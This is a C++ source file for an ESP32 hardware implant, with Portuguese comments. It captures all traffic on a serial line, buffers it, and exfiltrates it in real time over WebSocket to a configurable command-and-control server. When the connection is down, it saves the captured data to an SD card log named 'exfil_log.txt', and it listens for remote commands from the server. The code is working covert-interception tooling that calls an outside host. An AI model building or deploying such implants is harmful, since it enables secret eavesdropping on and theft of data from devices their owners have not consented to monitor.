#include "ImplantCore.h"

ESP32Implant::ESP32Implant(const char* ws_host, uint16_t ws_port, const char* ws_url) 
    : _host(ws_host), _port(ws_port), _url(ws_url) {}

void ESP32Implant::begin() {
    // Inicializa SD Card para persistência offline
    if(!SD.begin(SD_CS_PIN)) {
        Serial.println("SD Card mount failed! Data will be RAM-only.");
    }

    // Configuração do WebSocket (Exfiltração em Tempo Real)
    _webSocket.begin(_host, _port, _url);
    _webSocket.onEvent(webSocketEvent);
    _webSocket.setReconnectInterval(5000);
}

void ESP32Implant::update() {
    _webSocket.loop();
    
    // Simulação de Interceptação: Captura tudo que entra pela Serial2 (Pinos 16/17)
    while (Serial2.available()) {
        char c = Serial2.read();
        logData(String(c));
        Serial.print(c); // Mirror para debug local
    }
}

void ESP32Implant::logData(String data) {
    _dataBuffer += data;

    // Se atingir o limite ou encontrar um terminador crítico, exfiltra
    if (_dataBuffer.length() >= BUFFER_THRESHOLD) {
        if (_webSocket.isConnected()) {
            sendToC2();
        } else {
            saveToSD(_dataBuffer);
            _dataBuffer = "";
        }
    }
}

void ESP32Implant::sendToC2() {
    _webSocket.sendTXT(_dataBuffer);
    _dataBuffer = ""; // Limpa buffer após envio bem-sucedido
}

void ESP32Implant::saveToSD(String data) {
    File file = SD.open("/exfil_log.txt", FILE_APPEND);
    if(file) {
        file.print(data);
        file.close();
    }
}

void ESP32Implant::webSocketEvent(WStype_t type, uint8_t * payload, size_t length) {
    switch(type) {
        case WStype_DISCONNECTED:
            break;
        case WStype_CONNECTED:
            Serial.println("[C2] Connected to WebSocket Server");
            break;
        case WStype_TEXT:
            // Comandos remotos recebidos do Servidor Web
            Serial.printf("[C2] Command received: %s\n", payload);
            break;
    }
}